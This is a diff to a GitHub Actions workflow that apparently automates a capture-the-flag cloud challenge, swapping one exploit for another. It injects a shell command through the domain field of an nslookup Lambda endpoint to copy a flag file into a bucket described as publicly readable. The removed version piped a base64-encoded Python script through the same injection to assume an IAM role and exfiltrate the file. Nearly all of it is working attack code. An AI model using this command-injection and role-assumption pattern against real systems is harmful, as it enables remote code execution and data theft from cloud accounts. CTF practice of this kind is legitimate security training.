@@ -25,38 +25,22 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # Python script that runs INSIDE the Lambda inside the VPC:
-          # 1. Reads flag.txt as lambdaRole
-          # 2. Assumes CTFExecutionRole
-          # 3. Copies flag.txt into platform-bucket-009661764077-us-east-1
-          PY_SCRIPT="import boto3\n\
-          s3 = boto3.client('s3')\n\
-          flag_data = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read()\n\
-          sts = boto3.client('sts')\n\
-          try:\n\
-              assumed = sts.assume_role(RoleArn='arn:aws:iam::009661764077:role/CTFExecutionRole', RoleSessionName='BridgeSession')\n\
-              creds = assumed['Credentials']\n\
-              s3_elevated = boto3.client('s3', aws_access_key_id=creds['AccessKeyId'], aws_secret_access_key=creds['SecretAccessKey'], aws_session_token=creds['SessionToken'])\n\
-              s3_elevated.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag_data)\n\
-          except Exception as e:\n\
-              s3.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag_data)"
+          echo "=== 1. TRIGGERING DIRECT AWS CLI COPY INSIDE LAMBDA ==="
+          # Direct command injection using the AWS CLI installed in the Lambda layer
+          PAYLOAD='{"domain": "127.0.0.1; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1"}'
           
-          ENCODED_SCRIPT=$(echo -e "$PY_SCRIPT" | base64 -w 0)
-          
-          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${ENCODED_SCRIPT}' | base64 -d | python3\"}"
-          
-          echo "=== 1. EXECUTING BACKEND ASSUMEROLE & BRIDGE ==="
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR S3 PROPAGATION ==="
+          echo "=== 2. WAITING 3 SECONDS FOR S3 COPY ==="
           sleep 3
           
           echo "=== 3. DOWNLOADING FLAG FROM PLATFORM BUCKET ==="
+          # Download from platform-bucket where Principal * has GetObject access!
           aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag.txt" ./the_flag.txt
           
           echo ""
-          echo "=== 4. BEHOLD YOUR GLORIOUS VICTORY ==="
+          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
           cat ./the_flag.txt
